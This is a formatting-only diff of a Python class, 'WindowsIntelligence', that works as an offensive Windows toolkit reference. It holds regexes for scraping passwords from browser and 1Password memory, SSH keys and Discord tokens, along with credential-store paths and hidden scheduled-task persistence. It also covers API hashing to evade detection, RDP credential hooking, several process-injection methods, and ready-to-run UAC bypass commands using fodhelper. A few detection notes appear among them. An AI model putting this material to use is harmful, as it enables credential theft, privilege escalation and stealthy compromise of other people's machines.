@@ -35,7 +35,7 @@ class WindowsIntelligence:
             "process_connections": (
                 "SELECT p.name, p.path, pos.local_address, pos.remote_address "
                 "FROM processes p JOIN process_open_sockets pos USING (pid);"
-            )
+            ),
         }
 
     @staticmethod
@@ -46,7 +46,7 @@ class WindowsIntelligence:
             r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
             r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
             r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
-            r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+            r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
         ]
 
     @staticmethod
@@ -55,30 +55,19 @@ class WindowsIntelligence:
         return {
             "firefox": {
                 "process": "firefox.exe",
-                "patterns": [
-                    r"password[\"']\s*:\s*[\"']([^\"']+)[\"']",
-                    r"username[\"']\s*:\s*[\"']([^\"']+)[\"']"
-                ]
+                "patterns": [r"password[\"']\s*:\s*[\"']([^\"']+)[\"']", r"username[\"']\s*:\s*[\"']([^\"']+)[\"']"],
             },
             "chrome": {
                 "process": "chrome.exe",
-                "patterns": [
-                    r"\"password_element\"\s*:\s*\"([^\"]+)\"",
-                    r"\"username_element\"\s*:\s*\"([^\"]+)\""
-                ]
+                "patterns": [r"\"password_element\"\s*:\s*\"([^\"]+)\"", r"\"username_element\"\s*:\s*\"([^\"]+)\""],
             },
             "1password": {
                 "process": "1Password.exe",
-                "patterns": [
-                    r"master_password\s*[:=]\s*(\w+)",
-                    r"vault_key\s*[:=]\s*(\w+)"
-                ]
+                "patterns": [r"master_password\s*[:=]\s*(\w+)", r"vault_key\s*[:=]\s*(\w+)"],
             },
             "ssh_private_key": {
-                "patterns": [
-                    r"-----BEGIN [A-Z ]+ PRIVATE KEY-----[\s\S]+?-----END [A-Z ]+ PRIVATE KEY-----"
-                ]
-            }
+                "patterns": [r"-----BEGIN [A-Z ]+ PRIVATE KEY-----[\s\S]+?-----END [A-Z ]+ PRIVATE KEY-----"]
+            },
         }
 
     @staticmethod
@@ -88,7 +77,9 @@ class WindowsIntelligence:
             "hash_algorithm": "hash = (hash >> 13) | (hash << 19); hash += *str++;",
             "seed": 0,
             "target_dlls": ["kernel32.dll", "advapi32.dll", "user32.dll", "ntdll.dll"],
-            "resolution_method": "Walking PE export directory and comparing name hashes instead of using GetProcAddress"
+            "resolution_method": (
+                "Walking PE export directory and comparing name hashes instead of using GetProcAddress"
+            ),
         }
 
     @staticmethod
@@ -98,7 +89,7 @@ class WindowsIntelligence:
             "task_cache_path": r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks",
             "task_tree_path": r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree",
             "requirements": "Requires SeRestorePrivilege and a restart of the 'Schedule' service (gpsvc)",
-            "detection": "Mismatched timestamps or missing SD (Security Descriptor) values in the TaskCache registry"
+            "detection": "Mismatched timestamps or missing SD (Security Descriptor) values in the TaskCache registry",
         }
 
     @staticmethod
@@ -108,7 +99,7 @@ class WindowsIntelligence:
             "PrintNotify": "{854A20FB-2D44-457D-992F-EF13785D2B51}",
             "WUAUServ": "{e30629d1-150e-4433-a359-d23983fd20ae}",
             "Ipsessvc": "{A47979D2-C419-11D9-A5B4-001185AD2B89}",
-            "BITS": "{4991d34b-80a1-4291-83b6-3328366b9097}"
+            "BITS": "{4991d34b-80a1-4291-83b6-3328366b9097}",
         }
 
     @staticmethod
@@ -120,7 +111,7 @@ class WindowsIntelligence:
             r"HKLM\SECURITY\Policy\Secrets",
             r"C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials",
             r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config",
-            r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations"
+            r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations",
         ]
 
     @staticmethod
@@ -135,7 +126,7 @@ class WindowsIntelligence:
             "interesting_strings_discovery": (
                 "Searching for compiler markers (Go, Rust), debug paths, and project names"
             ),
-            "entropy_high_threshold": "Entropy > 7.2 often indicates XOR/AES payload within a section"
+            "entropy_high_threshold": "Entropy > 7.2 often indicates XOR/AES payload within a section",
         }
 
     @staticmethod
@@ -153,8 +144,8 @@ class WindowsIntelligence:
                 "$cred.getnetworkcredential().password"
             ),
             "hosts_redirection": (
-                "Add-Content -Path C:\\Windows\\System32\\drivers\\etc\\hosts -Value \"`n{ip} {domain}\""
-            )
+                'Add-Content -Path C:\\Windows\\System32\\drivers\\etc\\hosts -Value "`n{ip} {domain}"'
+            ),
         }
 
     @staticmethod
@@ -163,7 +154,7 @@ class WindowsIntelligence:
         return {
             "discord": {
                 "token_regex": [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"],
-                "local_storage_path": "Local Storage\\leveldb"
+                "local_storage_path": "Local Storage\\leveldb",
             }
         }
 
@@ -176,7 +167,7 @@ class WindowsIntelligence:
             "section_names_entropy": "Unusual section names often indicate packers",
             "import_distribution": "Ratio of unique DLLs to total imports",
             "string_heuristics": "Average string length and total count (malware often has few/long strings)",
-            "characteristics": "Flags like IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_DLL"
+            "characteristics": "Flags like IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_DLL",
         }
 
     @staticmethod
@@ -184,7 +175,7 @@ class WindowsIntelligence:
         """Techniques to steal RDP credentials via process hollowing or hooking."""
         return {
             "mstsc_hook": "Hooking CryptProtectMemory in mstsc.exe",
-            "rdp_redirection": "Redirecting RDP traffic via registry (fDisableCam), (fDisableCcm)"
+            "rdp_redirection": "Redirecting RDP traffic via registry (fDisableCam), (fDisableCcm)",
         }
 
     @staticmethod
@@ -203,7 +194,7 @@ class WindowsIntelligence:
             "iat_hooking": "Modifying the Import Address Table to point to proxy functions.",
             "inline_patching": "Replacing function preamble (5-6 bytes) with JMP/PUSH-RET (0x68 ... 0xC3).",
             "trampoline": "Copying original bytes to a buffer and jumping back to continue execution.",
-            "hardware_breakpoints": "Using Debug Registers (DR0-DR7) to trigger hooks without modifying code."
+            "hardware_breakpoints": "Using Debug Registers (DR0-DR7) to trigger hooks without modifying code.",
         }
 
     @staticmethod
@@ -214,7 +205,7 @@ class WindowsIntelligence:
             "writing": "NtWriteVirtualMemory",
             "execution": "NtCreateThreadEx",
             "protection": "NtProtectVirtualMemory",
-            "unmapping": "NtUnmapViewOfSection"
+            "unmapping": "NtUnmapViewOfSection",
         }
 
     @staticmethod
@@ -224,19 +215,17 @@ class WindowsIntelligence:
             "threadless_injection": (
                 "Hooking a frequently called export (e.g., AmsiScanBuffer) to trigger shellcode execution."
             ),
-            "early_bird_apc": (
-                "Queueing an APC to a thread in a suspended state (NtQueueApcThread) before resuming."
-            ),
+            "early_bird_apc": ("Queueing an APC to a thread in a suspended state (NtQueueApcThread) before resuming."),
             "module_stomping": "Overwriting an unused DLL in the target process memory with shellcode.",
-            "process_hollowing": "Starting a suspended process, unmapping its memory, and replacing it with own code."
+            "process_hollowing": "Starting a suspended process, unmapping its memory, and replacing it with own code.",
         }
 
     @staticmethod
     def get_uac_bypass_commands(executable_path: str) -> List[str]:
         """Commands for UAC bypass via registry hijacking (fodhelper, computerdefaults)."""
         return [
-            f"reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{executable_path}\" /f",
+            f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{executable_path}" /f',
             r"reg add hkcu\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /f",
             "fodhelper.exe",
-            "computerdefaults.exe"
+            "computerdefaults.exe",
         ]
